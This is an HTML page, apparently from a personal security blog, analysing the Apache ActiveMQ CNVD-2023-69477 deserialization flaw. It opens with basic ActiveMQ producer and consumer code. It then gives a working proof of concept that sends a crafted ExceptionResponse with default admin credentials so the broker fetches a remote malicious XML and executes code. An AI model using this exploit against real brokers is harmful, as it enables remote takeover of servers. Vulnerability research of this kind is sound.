@@ -1,0 +1,748 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ActiveMQ IntroActiveMQ是一个消息队列，消息队列是在消息的传输过程中保存消息的容器，提供不同进程或同一进程不同线程之间的通讯方式，基于JMS规范（JMS：Java Message Service Java消息服务，有一套API接口） 其他类似的消息中间件：RabbitMQ、Kafka、RocketMQ、ZeroMQ 消息中间件的作用主要有3点  异步性提升性能（放入消息队列，不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache ActiveMQ CNVD-2023-69477">
+<meta property="og:url" content="http://example.com/2023/11/06/activemq/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="ActiveMQ IntroActiveMQ是一个消息队列，消息队列是在消息的传输过程中保存消息的容器，提供不同进程或同一进程不同线程之间的通讯方式，基于JMS规范（JMS：Java Message Service Java消息服务，有一套API接口） 其他类似的消息中间件：RabbitMQ、Kafka、RocketMQ、ZeroMQ 消息中间件的作用主要有3点  异步性提升性能（放入消息队列，不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231106124601763.png">
+<meta property="og:image" content="http://example.com/img/image-20231106125707952.png">
+<meta property="og:image" content="http://example.com/img/image-20231106125814323.png">
+<meta property="og:image" content="http://example.com/img/image-20231106133454286.png">
+<meta property="og:image" content="http://example.com/img/image-20231106133809649.png">
+<meta property="og:image" content="http://example.com/img/image-20231115214755707.png">
+<meta property="og:image" content="http://example.com/img/image-20231115214735374.png">
+<meta property="og:image" content="http://example.com/img/image-20231115215030714.png">
+<meta property="og:image" content="http://example.com/img/image-20231115215110851.png">
+<meta property="og:image" content="http://example.com/img/image-20231115220641398.png">
+<meta property="og:image" content="http://example.com/img/image-20231115222932790.png">
+<meta property="og:image" content="http://example.com/img/image-20231115224203648.png">
+<meta property="og:image" content="http://example.com/img/image-20231115222421690.png">
+<meta property="og:image" content="http://example.com/img/image-20231115222604254.png">
+<meta property="og:image" content="http://example.com/img/image-20231115224406959.png">
+<meta property="og:image" content="http://example.com/img/image-20231115225326540.png">
+<meta property="og:image" content="http://example.com/img/image-20231115225456750.png">
+<meta property="article:published_time" content="2023-11-06T04:10:12.000Z">
+<meta property="article:modified_time" content="2023-11-15T14:57:15.367Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="middleware">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20231106124601763.png">
+  
+  
+  
+  <title>Apache ActiveMQ CNVD-2023-69477 - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Apache ActiveMQ CNVD-2023-69477"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-06 12:10" pubdate>
+          2023年11月6日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Apache ActiveMQ CNVD-2023-69477</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ActiveMQ-Intro"><a href="#ActiveMQ-Intro" class="headerlink" title="ActiveMQ Intro"></a>ActiveMQ Intro</h1><p>ActiveMQ是一个消息队列，消息队列是在消息的传输过程中保存消息的容器，提供不同进程或同一进程不同线程之间的通讯方式，基于JMS规范（JMS：Java Message Service Java消息服务，有一套API接口）</p>
+<p>其他类似的消息中间件：RabbitMQ、Kafka、RocketMQ、ZeroMQ</p>
+<p>消息中间件的作用主要有3点</p>
+<ul>
+<li>异步性提升性能（放入消息队列，不需要立即处理）</li>
+<li>降低耦合度</li>
+<li>流量削峰（消息中间件起到了缓冲的作用）</li>
+</ul>
+<p><img src="/./../img/image-20231106124601763.png" srcset="/img/loading.gif" lazyload alt="image-20231106124601763"></p>
+<ul>
+<li>producer：消息生产者</li>
+<li>broker：消息处理中心，存储、确认、重试（broker可以翻译成代理）</li>
+<li>consumer：消息消费者</li>
+</ul>
+<p>ActiveMQ支持多种应用协议：OpenWire（常用）、StompREST、WSNotification、AMQP。</p>
+<p>提供了两种消息模式：点对点模式（Queue）、发布订阅模式（Topic）</p>
+<p>点对点模式中队列的消息只会被一个消费者所消费</p>
+<p><img src="/./../img/image-20231106125707952.png" srcset="/img/loading.gif" lazyload alt="image-20231106125707952"></p>
+<p>发布订阅模式中每个订阅者都会收到消息</p>
+<p><img src="/./../img/image-20231106125814323.png" srcset="/img/loading.gif" lazyload alt="image-20231106125814323"></p>
+<p>JMS定义的消息体类型有如下几种：</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TextMessage</td>
+<td>文本消息</td>
+</tr>
+<tr>
+<td>MapMessage</td>
+<td>k&#x2F;v</td>
+</tr>
+<tr>
+<td>BytesMessage</td>
+<td>字节流</td>
+</tr>
+<tr>
+<td>StreamMessage</td>
+<td>java原始的数据流</td>
+</tr>
+<tr>
+<td>ObjectMessage</td>
+<td>序列化的java对象</td>
+</tr>
+</tbody></table>
+<h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><p>windows下ActiveMQ下载👉<a target="_blank" rel="noopener" href="https://activemq.apache.org/download-archives.html">https://activemq.apache.org/download-archives.html</a></p>
+<p>这里下载5.18.2版本，<code>/bin/win64</code>目录下有一个<code>activemq.bat</code>，ActiveMQ默认端口为61616</p>
+<p>ActiveMQ还提供了管理员控制台<code>http://localhost:8161/admin/</code></p>
+<p>默认账号密码admin&#x2F;admin</p>
+<p>Java引入依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.activemq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>activemq-all<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.18.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>Provider</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;<br><br><span class="hljs-keyword">import</span> javax.jms.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JmsSender</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">brokerURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;tcp://127.0.0.1:61616&quot;</span>;<br>            <span class="hljs-comment">// create ConnectionFactory</span><br>            <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">mqConnectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveMQConnectionFactory</span>(brokerURL);<br><br>            connection = mqConnectionFactory.createConnection();<br>            connection.start();<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * Session createSession(boolean transacted, int acknowledgeMode) 创建会话</span><br><span class="hljs-comment">             * transacted ：表示是否开启事务</span><br><span class="hljs-comment">             * acknowledgeMode：表示会话确认模式</span><br><span class="hljs-comment">             *      AUTO_ACKNOWLEDGE 自动确认</span><br><span class="hljs-comment">             *      CLIENT_ACKNOWLEDGE 客户确认</span><br><span class="hljs-comment">             */</span><br>            session = connection.createSession(Boolean.TRUE, Session.AUTO_ACKNOWLEDGE);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * createQueue(String queueName)：创建消息队列，指定队列名称，消费者可以根据队列名称获取消息</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-type">Destination</span> <span class="hljs-variable">destination</span> <span class="hljs-operator">=</span> session.createQueue(<span class="hljs-string">&quot;queue-app&quot;</span>);<br>            <span class="hljs-type">MessageProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> session.createProducer(destination);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">massageTotal</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; massageTotal; i++) &#123;<br>                <span class="hljs-comment">// 创建一个文本消息</span><br>                <span class="hljs-type">TextMessage</span> <span class="hljs-variable">textMessage</span> <span class="hljs-operator">=</span> session.createTextMessage(<span class="hljs-string">&quot;Round &quot;</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;\n&quot;</span>);<br>                producer.send(textMessage);  <span class="hljs-comment">// 生产者发送消息</span><br>                session.commit();  <span class="hljs-comment">// 会话提交</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    session.close(); <span class="hljs-comment">//关闭会话</span><br>                &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    connection.close(); <span class="hljs-comment">//关闭连接</span><br>                &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>Consumer</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;<br><span class="hljs-keyword">import</span> javax.jms.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JmsReceiver</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">brokerURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;tcp://127.0.0.1:61616&quot;</span>;<br>            <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">mqConnectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveMQConnectionFactory</span>(brokerURL);<br><br>            connection = mqConnectionFactory.createConnection();<br>            connection.start();<br><br>            session = connection.createSession(Boolean.TRUE, Session.AUTO_ACKNOWLEDGE);<br><br>            <span class="hljs-type">Destination</span> <span class="hljs-variable">destination</span> <span class="hljs-operator">=</span> session.createQueue(<span class="hljs-string">&quot;queue-app&quot;</span>);<br>            <span class="hljs-type">MessageConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> session.createConsumer(destination);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">massageTotal</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; massageTotal; i++) &#123;<br>                <span class="hljs-type">TextMessage</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (TextMessage) consumer.receive(); <span class="hljs-comment">// 消费者接收消息。因为对方发送的文本消息，所以可以强转</span><br>                session.commit(); <span class="hljs-comment">// 确认消息，告诉中间件，消息已经确认接收</span><br>                System.out.println((i + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;: &quot;</span> + message.getText());  <span class="hljs-comment">// 获取消息文本</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    session.close();<span class="hljs-comment">//关闭会话</span><br>                &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    connection.close();<span class="hljs-comment">//关闭连接</span><br>                &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>Consumer</code>端成功打印文本消息</p>
+<p><img src="/./../img/image-20231106133454286.png" srcset="/img/loading.gif" lazyload alt="image-20231106133454286"></p>
+<p><img src="/./../img/image-20231106133809649.png" srcset="/img/loading.gif" lazyload alt="image-20231106133809649"></p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>漏洞版本：ActiveMQ &lt; 5.18.3</p>
+<p>攻击对象：ActiveMQ服务端</p>
+<p><code>ExceptionResponseMarshaller</code>的<code>tightUnmarshal</code>或<code>looseUnmarshal</code></p>
+<p><img src="/./../img/image-20231115214755707.png" srcset="/img/loading.gif" lazyload alt="image-20231115214755707"></p>
+<p><img src="/./../img/image-20231115214735374.png" srcset="/img/loading.gif" lazyload alt="image-20231115214735374"></p>
+<p>会调用到父类的<code>BaseDataStreamMarshaller</code>的<code>tightUnmarsalThrowable</code>或<code>looseUnmarsalThrowable</code></p>
+<p><img src="/./../img/image-20231115215030714.png" srcset="/img/loading.gif" lazyload alt="image-20231115215030714"></p>
+<p>分别反序列化类名和消息，接着调用<code>createThrowable</code></p>
+<p><img src="/./../img/image-20231115215110851.png" srcset="/img/loading.gif" lazyload alt="image-20231115215110851"></p>
+<p>调用了类的构造方法，且构造方法只接收一个字符串</p>
+<p>上面可知ActiveMQ的8161端口提供了一个管理员控制台，那就大概率依赖了<code>Spring Web</code>，看一下<code>ActiveMQ</code>的<code>lib</code>目录，果然有。</p>
+<p>那就可以考虑调用<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>的构造方法，远程加载恶意xml文件RCE。</p>
+<p>ActiveMQ服务端接收到消息后，会调用<code>org.apache.activemq.openwire.OpenWireFormat#unmarshal</code></p>
+<p><code>unmarshal</code>再到<code>doUnmarshal</code>，从数据流里读取数据类型，获取对应的序列化器，调用其<code>tightUnmarshal</code>或<code>looseUnmarshal</code></p>
+<p>为接上面的sink点，我们这里需要获取到<code>ExceptionResponseMarshaller</code></p>
+<p><img src="/./../img/image-20231115220641398.png" srcset="/img/loading.gif" lazyload alt="image-20231115220641398"></p>
+<p>对应的，客户端发送消息，会调用<code>marshal</code>，也是根据类型获取序列化器</p>
+<p><img src="/./../img/image-20231115222932790.png" srcset="/img/loading.gif" lazyload alt="image-20231115222932790"></p>
+<p>看看<code>ExceptionResponseMarshaller#tightMarshal1</code> -&gt; <code>BaseDataStreamMarshaller#tightMarshalThrowable1</code></p>
+<p><img src="/./../img/image-20231115224203648.png" srcset="/img/loading.gif" lazyload alt="image-20231115224203648"></p>
+<p>这里获取了异常类的类名和消息（<code>Throwable</code>继承了其父类的<code>message</code>属性）</p>
+<p><code>ExceptionResponseMarshaller</code>即为<code>ExceptionResponse</code>的序列化器</p>
+<p><img src="/./../img/image-20231115222421690.png" srcset="/img/loading.gif" lazyload alt="image-20231115222421690"></p>
+<p>异常打印的消息来自于<code>exception</code>成员，所以<code>ClassPathXmlApplicationContext</code>需要继承<code>Throwable</code></p>
+<p><img src="/./../img/image-20231115222604254.png" srcset="/img/loading.gif" lazyload alt="image-20231115222604254"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.springframework.context.support;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Throwable</span>&#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ClassPathXmlApplicationContext</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-built_in">this</span>.message = message;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> message;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;<br><span class="hljs-keyword">import</span> org.apache.activemq.ActiveMQSession;<br><span class="hljs-keyword">import</span> org.apache.activemq.command.ExceptionResponse;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">import</span> javax.jms.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ActiveMQConnectionFactory</span>(<span class="hljs-string">&quot;tcp://127.0.0.1:61616&quot;</span>);<br><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.createConnection(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>);<br>        connection.start();<br>        <span class="hljs-type">ActiveMQSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> (ActiveMQSession) connection.createSession(Boolean.TRUE, Session.AUTO_ACKNOWLEDGE);<br>        <span class="hljs-type">ExceptionResponse</span> <span class="hljs-variable">exceptionResponse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionResponse</span>();<br><br>        exceptionResponse.setException(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/poc.xml&quot;</span>));<br>        session.syncSendPacket(exceptionResponse);<br>        connection.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231115224406959.png" srcset="/img/loading.gif" lazyload alt="image-20231115224406959"></p>
+<h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p><a target="_blank" rel="noopener" href="https://github.com/apache/activemq/compare/activemq-5.18.3...activemq-6.0.0">https://github.com/apache/activemq/compare/activemq-5.18.3...activemq-6.0.0</a></p>
